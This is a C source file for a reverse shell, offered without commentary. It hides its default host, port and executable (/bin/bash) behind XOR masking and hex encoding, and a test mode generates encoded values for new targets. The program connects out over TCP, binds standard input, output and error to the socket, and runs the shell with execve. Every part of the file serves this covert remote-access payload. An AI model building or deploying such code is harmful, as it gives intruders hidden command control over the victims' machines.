#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <limits.h>

// Environment variable names
#define ENV_SAK_DBUG "SAKDBG"
#define ENV_SAK_HOST "SAKHST"
#define ENV_SAK_PORT "SAKPRT"
#define ENV_SAK_HASH "SAKHSH"
#define ENV_SAK_TEST "SAKTST"
#define ENV_SAK_EXEC "SAKEXC"

// Default values
#define DEFAULT_EXEC "1A070A0B1652524A5C"
#define DEFAULT_HOST "0457544B091E031705"
#define DEFAULT_PORT "04565052"
#define DEFAULT_HASH "5ece90394a27960f"

// TODO: Fix hex conversion for all port ranges
#define MAX_PORT_NUM 16384

// Apply mask "key" to string "msg" (not encrypted, it's encoded ;)
char *xmask(char * msg, char * key) {
  int i;
  size_t msglen = strlen(msg);
  size_t keylen = strlen(key);
  char * masked = malloc(msglen+1);

  for(i = 0; i < msglen; i++) {
    masked[i] = msg[i] ^ key[i % keylen];
  }

  masked[msglen] = '\0';

  return masked;
}

// Convert char[] to hex values
// TODO: Fix edge cases on two-way hex values
char *tohex(char *src)
{
  int i, j = 0;
  size_t srclen = strlen(src);
  char * masked = malloc((srclen * 2) + 1);

  for (i = 0; i < srclen; i++) {
    sprintf(masked + j, "%02X", src[i]);
    j += 2;
  }

  masked[j] = '\0';

  return masked;
}

// Convert char[] from hex values
// TODO: Fix edge cases on two-way hex values
char *unhex(char *src)
{
  int i, j = 0;
  char chunk[3];
  size_t srclen = strlen(src);
  size_t reslen = ((int)(srclen / 2) + 1);
  char * unmasked = malloc((srclen / 2) + 1);

  for (i = 0; i < srclen; i += 2) {
    sprintf(chunk, "%c%c", src[i], src[i+1]);
    sprintf(unmasked + j, "%c", (int)strtol(chunk, NULL, 16));
    j++;
  }

  unmasked[j] = '\0';

  return unmasked;
}

int main (int argc, char *argv[]) {

  int i;
  struct sockaddr_in addr;
  char *verbenv = getenv(ENV_SAK_DBUG);
  char *hostenv = getenv(ENV_SAK_HOST);
  char *portenv = getenv(ENV_SAK_PORT);
  char *hashenv = getenv(ENV_SAK_HASH);
  char *testenv = getenv(ENV_SAK_TEST);
  char *execenv = getenv(ENV_SAK_EXEC);
  char *host = (testenv && argc > 1) ? argv[1] : (hostenv ? hostenv : DEFAULT_HOST);
  char *port = (testenv && argc > 2) ? argv[2] : (portenv ? portenv : DEFAULT_PORT);
  char *hash = (testenv && argc > 3) ? argv[3] : (hashenv ? hashenv : DEFAULT_HASH);
  char *exek = (testenv && argc > 4) ? argv[4] : (execenv ? execenv : DEFAULT_EXEC);
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);

  if (!hash) {
    printf("Epic fail\n");
    return 69;
  }

  if (testenv && strcmp(testenv, "123") == 0) {
    int portnum = atoi(port);
    char *hostxor = xmask(host, hash);
    char *hosthex = tohex(hostxor);
    char *hostval = unhex(hosthex);
    char *hostres = xmask(hostval, hash);
    char *portxor = xmask(port, hash);
    char *porthex = tohex(portxor);
    char *portval = unhex(porthex);
    char *portres = xmask(portval, hash);
    char *execxor = xmask(exek, hash);
    char *exechex = tohex(execxor);
    char *execval = unhex(exechex);
    char *execres = xmask(execval, hash);

    if (portnum < 1 || portnum > MAX_PORT_NUM) {
      printf("Out of range\n");
      return 69;
    }

    printf("--------------------------------\n");
    printf("ENV: %s:%s\n", host, port);
    printf("--------------------------------\n");
    printf("%s=%s\n", ENV_SAK_HASH, hash);
    printf("%s=%s\n", ENV_SAK_HOST, hosthex);
    printf("%s=%s\n", ENV_SAK_PORT, porthex);
    printf("%s=%s\n", ENV_SAK_EXEC, exechex);

    if (strlen(hostres) != strlen(host) || strcmp(hostres, host) != 0) {
      printf("ERROR: Host encoding failed! (%s != %s)", host, hostres);
      return 1;
    }

    if (atoi(port) != atoi(portres)) {
      printf("ERROR: Port encoding failed! (%s != %s)", port, portres);
      return 2;
    }

    if (strlen(execres) != strlen(exek) || strcmp(execres, exek) != 0) {
      printf("ERROR: exek encoding failed! (%s != %s)", exek, execres);
      return 1;
    }

    return 0;
  }

  char *hostres = xmask(unhex(host), hash);
  char *portres = xmask(unhex(port), hash);
  char *execres = xmask(unhex(exek), hash);
  int portnum = atoi(portres);

  if (portnum < 1 || portnum > MAX_PORT_NUM) {
    printf("Out of range\n");
    return 69;
  }

  if (verbenv && strcmp(verbenv, "69") == 0) {
    printf("CONN: %s:%i ...\n", hostres, portnum);
    printf("HOST: [%s] => %s\n", host, hostres);
    printf("PORT: [%s] => %s\n", port, portres);
    printf("EXEC: [%s] => %s\n", exek, execres);
  }

  addr.sin_family = AF_INET;
  addr.sin_port = htons(portnum);

  inet_aton(hostres, &addr.sin_addr);
  connect(sockfd, (const struct sockaddr *)&addr, sizeof(addr));

  for (i = 0; i < 3;i++) { dup2(sockfd, i); }

  execve(execres, NULL, NULL);
  return 0;
}
